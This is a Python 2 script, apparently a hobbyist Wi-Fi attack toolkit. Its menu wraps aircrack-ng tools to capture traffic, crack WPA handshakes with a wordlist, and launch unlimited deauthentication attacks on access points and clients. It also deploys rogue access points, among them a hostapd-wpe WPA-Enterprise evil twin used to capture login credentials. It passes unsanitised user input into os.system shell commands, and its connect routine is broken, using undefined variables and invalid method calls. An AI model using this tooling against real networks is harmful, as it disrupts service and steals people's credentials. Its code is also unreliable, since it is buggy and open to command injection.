#!/usr/bin/env python

import os
import sys
import time
from wifi import Cell, Scheme
'''
interfaz = 'wlxc04a00118487'
'''
interfaz = raw_input('Network interface: ')
#os.system("sudo ifconfig "+interfaz+" down")
#os.system("sudo iwconfig "+interfaz+" mode managed")
#os.system("sudo ifconfig "+interfaz+" up")
redes = []


def menu():
	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect (working on it)\n3: Capture traffic \n4: Crack handshake from pcap\n5: Deauth attack \n6: Create AP\n')
	if   opt_ == "1":
		scan()
	elif opt_=="2":
		connect()
	elif opt_=="3":
		capture_traffic()
	elif opt_=="4":
		crack_wpa()
	elif opt_=="5":
		deauth()
	elif opt_=="6":
		create_ap()
	else:
		print "Unknown option"


def create_ap():
	ap_type=raw_input("Options: \n1: Open \n2: WPE \n3: WPA2\n4: WPA-Enterprise (AP+Radius Server) \n")
	if not os.path.isdir("temp"):
		os.system("mkdir temp")

	if ap_type == "1":
		essid=raw_input("Network name:")
		channel=raw_input("Channel:")
		print "Creating conf file in temp/"
		os.system("echo 'interface="+interfaz+"\ndriver=nl80211\nssid="+essid+"\nhw_mode=g\nchannel="+channel+"\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=0\nmacaddr_acl=1' > temp/open.conf")
		time.sleep(1)
		print "Deploying AP..."
		os.system("sudo hostapd temp/open.conf")
	elif ap_type == "2":
		essid=raw_input("Network name:")
		passphrase = raw_input("Passphrase:")
		while ( len(passphrase)!=5 and len(passphrase)!=13 and len(passphrase)!=16 and len(passphrase)!=29):
			print "Incorrect length (5,13,16 or 29 characters)"
			passphrase = raw_input("Passphrase:")
		channel=raw_input("Channel:")
		print "Creating conf file in temp/"
		os.system("echo 'interface="+interfaz+"\ndriver=nl80211\nssid="+essid+"\nhw_mode=g\nchannel="+channel+"\nmacaddr_acl=0\nauth_algs=3\nignore_broadcast_ssid=0\nwep_default_key=1\nwep_key1=\""+passphrase+"\"\nwep_key_len_broadcast=\"5\"\nwep_key_len_unicast=\"5\"\nwep_rekey_period=300' > temp/wep.conf")
		time.sleep(1)
		print "Deploying AP..."
		os.system("sudo hostapd temp/wep.conf")
	elif ap_type == "3":
		essid=raw_input("Network name:")
		passphrase = raw_input("Passphrase:")
		while len(passphrase)<8:
			print "Incorrect length (8 or more characters)"
			passphrase = raw_input("Passphrase:")
		channel=raw_input("Channel:")
		print "Creating conf file in temp/"
		os.system("echo 'interface="+interfaz+"\nssid="+essid+"\nchannel="+channel+"\nwpa_passphrase="+passphrase+"\nhw_mode=g\nieee80211n=1\nwmm_enabled=1\nauth_algs=1\nwpa=2 \nwpa_key_mgmt=WPA-PSK \nrsn_pairwise=CCMP' > temp/wpa.conf")
		time.sleep(1)
		print "Deploying AP..."
		os.system("sudo hostapd temp/wpa.conf")
	elif ap_type == "4":
		essid=raw_input("Network name:")
		channel=raw_input("Channel:")
		print "Creating conf file in temp/"
		os.system("echo 'interface="+interfaz+"\neap_user_file=hostapd-wpe.eap_user\nca_cert=certs/ca.pem\nserver_cert=certs/server.pem\nprivate_key=certs/server.pem\nprivate_key_passwd=whatever\ndh_file=certs/dh\nssid="+essid+"\nhw_mode=g\nchannel="+channel+"\neap_server=1\neap_fast_a_id=101112131415161718191a1b1c1d1e1f\neap_fast_a_id_info=hostapd-wpe\neap_fast_prov=3\nieee8021x=1\npac_key_lifetime=604800\npac_key_refresh_time=86400\npac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\nwpa=1\nwpa_key_mgmt=WPA-EAP\nwpa_pairwise=TKIP CCMP\nlogger_syslog=-1\nlogger_syslog_level=2\nlogger_stdout=-1\nlogger_stdout_level=2\nctrl_interface=/var/run/hostapd\nctrl_interface_group=0\nbeacon_int=100\ndtim_period=2\nmax_num_sta=255\nrts_threshold=2347\nfragm_threshold=2346\nmacaddr_acl=0\nauth_algs=3\nignore_broadcast_ssid=0\nwmm_enabled=1\nwmm_ac_bk_cwmin=4\nwmm_ac_bk_cwmax=10\nwmm_ac_bk_aifs=7\nwmm_ac_bk_txop_limit=0\nwmm_ac_bk_acm=0\nwmm_ac_be_aifs=3\nwmm_ac_be_cwmin=4\nwmm_ac_be_cwmax=10\nwmm_ac_be_txop_limit=0\nwmm_ac_be_acm=0\nwmm_ac_vi_aifs=2\nwmm_ac_vi_cwmin=3\nwmm_ac_vi_cwmax=4\nwmm_ac_vi_txop_limit=94\nwmm_ac_vi_acm=0\nwmm_ac_vo_aifs=2\nwmm_ac_vo_cwmin=2\nwmm_ac_vo_cwmax=3\nwmm_ac_vo_txop_limit=47\nwmm_ac_vo_acm=0\neapol_key_index_workaround=0\nown_ip_addr=127.0.0.1' > temp/enterprise.conf")
		time.sleep(1)
		print "Deploying AP..."
		os.system("sudo airmon-ng check kill")
		os.system("cd hostapd-wpe && sudo ./hostapd-wpe ../temp/enterprise.conf")


def deauth_client():
	id_red = raw_input('Select id: ')
	red=redes[int(id_red)]
	ap_mac=red.get("mac")
	essid=red.get("ssid")
	channel=red.get("canal")
	client_mac = raw_input("Client MAC:")
	#os.system("sudo ifconfig "+interfaz+" down")
	#os.system("sudo iwconfig "+interfaz+" mode monitor")
	#os.system("sudo ifconfig "+interfaz+" up")
	os.system("sudo iwconfig "+interfaz+" channel "+channel)
	os.system("sudo aireplay-ng -0 0 -a "+ap_mac+" -c "+client_mac+" -e \""+essid+"\" "+interfaz)


def deauth_ap():
	id_red = raw_input('Select id: ')
	red=redes[int(id_red)]
	ap_mac=red.get("mac")
	essid=red.get("ssid")
	channel=red.get("canal")
	#os.system("sudo ifconfig "+interfaz+" down")
	#os.system("sudo iwconfig "+interfaz+" mode monitor")
	#os.system("sudo ifconfig "+interfaz+" up")
	os.system("sudo iwconfig "+interfaz+" channel "+channel)
	cmmd= ("sudo aireplay-ng -0 0 -a "+ap_mac+" -e \""+essid+"\" "+interfaz)
	os.system(cmmd)


def deauth():
	deauth_type=raw_input("1: AP deauth \n2: Client deauth\n")
	if deauth_type == "1":
		deauth_ap()
	else:
		deauth_client()


def crack_wpa():
	dictionary = raw_input("Dictionary file: ")
	pcap_name = raw_input("Pcap file name: ")
	os.system("sudo aircrack-ng -w "+dictionary+" "+pcap_name)


def capture_traffic():
	output_format="pcap"
	pcap_name = raw_input("Ouput file name (without extension): ")
	os.system("sudo airodump-ng -w "+pcap_name+" --output-format "+output_format+" "+interfaz)

def connect():
	id_red = raw_input('Select id: ')
	red = redes[int(id_red)]
	essid = red.get("ssid")
	conf_file = "temp/last_connection.conf"
	cifrado = red.get("cifrado").lowercase
	print "Connecting a network with %s encryption" % (cifrado)
	if cifrado == "none":
		os.system("echo 'network={\nssid=\""+essid+"\"\nkey_mgmt=NONE\npriority=100\n}' > conf_file")
	elif cifrado == "wep":
		passphrase = raw_input("Passphrase:")
		while ( len(passphrase)!=5 and len(passphrase)!=13 and len(passphrase)!=16 and len(passphrase)!=29):
			print "Incorrect length (5,13,16 or 29 characters)"
			passphrase = raw_input("Passphrase:")
		os.system("echo 'network={\nssid=\""+essid+"\"\nkey_mgmt=NONE\nwep_key0=\""+password+"\"\nwep_tx_keyidx=0}' > conf_file")
	elif cifrado.startswith("wpa"):
		passphrase = raw_input("Passphrase:")
		while len(passphrase)<8:
			print "Incorrect length (8 or more characters)"
			passphrase = raw_input("Passphrase:")
		os.system( "wpa_passphrase "+essid+" "+password+" > " + conf_file)
	else:
		print "Unknown encryption type"
	# Connection
	os.system("wpa_supplicant -Dnl80211 -i "+interfaz+" -c "+conf_file+" &")
	sys.exit()
	'''
	#PEAP+MSCHAPv2
	os.system("echo 'ctrl_interface=DIR=/var/run/wpa_supplicant \nnetwork={ \nssid=\""+essid+"\"\nscan_ssid=1 \nkey_mgmt=WPA-EAP \neap=PEAP \nidentity=\""+identity+"\"\npassword=\""+password+"\" \nphase1=\"peaplabel=0\" \nphase2=\"auth=MSCHAPV2\" \n}' > "+conf_file)		
	'''


def scan():
	global redes
	list_ = []
	redes = []
	print "\nScanning...\n"
	while len(list_) == 0:
		list_ = Cell.all(interfaz)
	count = 0
	for i in list_:
		ssid = i.ssid
		mac = i.address
		frecuencia = i.frequency
		canal = i.channel
		max_rate= i.bitrates[len(i.bitrates)-1]
		if i.encrypted:
			cifrado = i.encryption_type
		else:
			cifrado = "None"
		redes.append( { "id":str(count), "ssid": str(ssid), "cifrado": str(cifrado), "mac": str(mac), "frecuencia": str(frecuencia), "canal": str(canal), "rate": str(max_rate) } )
		count+=1
	for red in redes:
		print "- ", red.get("ssid"),"(ID = ",red.get("id"),")"
		print "   MAC:"+red.get("mac")+"	Cypher:"+red.get("cifrado")+"\n   Canal:"+red.get("canal")+"("+red.get("frecuencia")+")		Rate:"+red.get("rate")
		print "---------------------------------------------------------"
	menu()


def main():
	#scan()
	menu()



if __name__ == "__main__":
    main()
